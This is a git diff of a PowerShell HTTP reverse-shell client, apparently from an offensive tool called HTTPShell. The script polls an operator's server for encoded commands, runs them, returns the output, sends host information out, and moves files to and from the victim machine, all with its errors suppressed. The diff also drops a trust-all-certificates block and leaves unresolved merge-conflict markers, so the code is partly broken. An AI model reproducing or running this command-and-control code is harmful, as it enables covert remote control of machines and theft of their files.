@@ -17,21 +17,13 @@ if (($args[0] -like "-h*") -or ($args[1] -eq $null)){
 Write-Host "[!] Usage: .\HTTP-Client.ps1 -c [HOST:PORT] -s [SLEEP] (optional)`n" -ForegroundColor "Red" ; exit }
 
 # Proxy Aware & TLS Legacy Support
-add-type @"
-using System.Net;
-using System.Security.Cryptography.X509Certificates;
-public class TrustAllCertsPolicy : ICertificatePolicy {
-public bool CheckValidationResult(
-ServicePoint srvPoint, X509Certificate certificate,
-WebRequest request, int certificateProblem) {
-return true; }}
-"@
+$ProxyKey="HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+$ProxyServer=(Get-ItemProperty -path $ProxyKey ProxyServer 2> $null) ; if ($ProxyServer){
+[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
+[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials }
 
 $Values = $(Foreach ($Value in [System.Enum]::GetNames([System.Net.SecurityProtocolType])){
 [System.Net.SecurityProtocolType]::$Value}) ; $SecureProtocols = [string]$Values
-[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()
-[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
-[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 $AllProtocols = [System.Net.SecurityProtocolType]"$($SecureProtocols.replace(' ',','))"
 [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
 
@@ -42,68 +34,64 @@ function GetEnviron {
 
 function R64Encoder {
    if ($args[0] -eq "-t") { 
-      $encode = $($base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1]))) 2>&1> $null }
+      $base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) 2> $null }
    if ($args[0] -eq "-f") { 
-      $encode = $($base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1]))) 2>&1> $null }
-   $encode = $($base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_")) 2>&1> $null
-   $encode = $($revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64) 2>&1> $null ; return $R64Base }
+      $base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) 2> $null }
+   $base64 = $base64.Split("=")[0] ; $base64 = $base64.Replace("+", "-") ; $base64 = $base64.Replace("/", "_") 2> $null
+   $revb64 = $base64.ToCharArray() ; [array]::Reverse($revb64) ; $R64Base = -join $revb64 2> $null ; return $R64Base }
 
 function R64Decoder {
    $base64 = $args[1].ToCharArray() ; [array]::Reverse($base64) ; $base64 = -join $base64
    $base64 = [string]$base64.Replace("-", "+") ; $base64 = [string]$base64.Replace("_", "/")
    switch ($base64.Length % 4) { 0 { break } ; 2 { $base64 += "=="; break } ; 3 { $base64 += "="; break }}
    if ($args[0] -eq "-t") {
-      $decode = $($revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64))) 2>&1> $null }
+      $revb64 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($base64)) 2> $null }
    if ($args[0] -eq "-f") {
-      $decode = $($revb64 = [System.Convert]::FromBase64String($base64)) } return $revb64 }
+      $revb64 = [System.Convert]::FromBase64String($base64) } return $revb64 }
 
 function Send-HttpRequest {
    param ([string]$url, [string]$method, [string]$body)
-   if ($url -notlike "http*") { $url = "http://" + $url }
    $request = [System.Net.HttpWebRequest]::Create($url)
    $request.Method = $method ; $request.UserAgent = $userAgent
    $request.ContentType = "application/x-www-form-urlencoded"
    if ($body) {
       $bytes = [System.Text.Encoding]::ASCII.GetBytes($body)
-      $requestStream = $request.GetRequestStream()
-      $requestStream.Write($bytes, 0, $bytes.Length)
-      $requestStream.Close()}
-   $response = $request.GetResponse()
-   $responseStream = $response.GetResponseStream()
-   $reader = New-Object System.IO.StreamReader($responseStream)
-   $responseText = $reader.ReadToEnd() ; $reader.Close()
-   $response.Close() ; return $responseText ; $url }
+      $r = $($requestStream = $request.GetRequestStream()) 2> $null
+      $r = $($requestStream.Write($bytes, 0, $bytes.Length)) 2> $null
+      $r = $($requestStream.Close()) 2> $null }
+   $r = $($response = $request.GetResponse()) 2> $null
+   $r = $($responseStream = $response.GetResponseStream()) 2> $null
+   $r = $($reader = New-Object System.IO.StreamReader($responseStream)) 2> $null
+   $r = $($responseText = $reader.ReadToEnd()) 2> $null
+   $r = $($reader.Close()) 2> $null ; $r = $($response.Close()) 2> $null
+   return $responseText ; $url }
 
 # Main
 while ($true) {
+   if ($server -notlike "http*") { $server = "http://" + $server }
    $invoke64 = "Write-Output HTTPShellNull" ; if ($sleeps) { Start-Sleep $sleeps }
-   $env = GetEnviron ; $commandx = $null ; $errorlog = $null ; $getenv64 = R64Encoder -t $env
-   $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2>&1> $null
-   $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2>&1> $null
-   $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2>&1> $null
+   $env = GetEnviron ; $commandx = $null ; $errorlog = $null ; $getenv64 = $(R64Encoder -t $env) 2> $null
+   $request1 = $(Send-HttpRequest "$server/api/v1/Client/Info" "POST" "Info: $getenv64") 2> $null
+   $response = $($token = Send-HttpRequest "$server/api/v1/Client/Token" "GET") 2> $null
+   $response = $($invoke64 = R64Decoder -t ($token.Split(" ")[-1])) 2> $null
 
    if ($invoke64 -like "upload*") {
       $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
       if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
-      $download = $($file_content = Send-HttpRequest "$server/api/v1/Client/Download" "GET") 2>&1> $null
-      $file_content = R64Decoder -f $file_content.ToString().Split(" ")[-1]
-      [IO.File]::WriteAllBytes("$file_path", $file_content)}
+      $download = $($file_content = Send-HttpRequest "$server/api/v1/Client/Download" "GET") 2> $null
+      $file_content = $(R64Decoder -f $file_content.ToString().Split(" ")[-1]) 2> $null
+      [IO.File]::WriteAllBytes("$file_path", $file_content) 2> $null }
 
    if ($invoke64 -like "download*") {
       $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
       if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
-      $file_content = R64Encoder -f "$file_path"
-      $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2>&1> $null }
+      $file_content = $(R64Encoder -f "$file_path") 2> $null
+      $upload = $(Send-HttpRequest "$server/api/v1/Client/Upload" "POST" "File: $file_content") 2> $null }
 
    if ($pwshversion -gt 4) { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64 $redirectors") | Out-String) 2>&1 }}
    else { if ($invoke64) { $errorlog = $($commandx = pwn ("$invoke64") | Out-String) 2>&1 }} ; $param = "Debug"
    if ($errorlog -ne $null) { $commandx = Write-Output $error[0] | Out-String ; $param = "Error" }
    if (($invoke64 -like "cd*") -or ($invoke64 -like "Set-Location*")) { if (!$errorlog) { $commandx = "HTTPShellNull" }}
-<<<<<<< HEAD
    $output64 = $(R64Encoder -t $commandx) 2> $null ; [string]$path = $param
    $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2> $null }
    
-=======
-   $output64 = R64Encoder -t $commandx ; [string]$path = $param
-   $request2 = $(Send-HttpRequest "$server/api/v1/Client/$path" "POST" "$param`: $output64") 2>&1> $null }}
->>>>>>> parent of ad83137 (Update HTTP-Client.ps1)
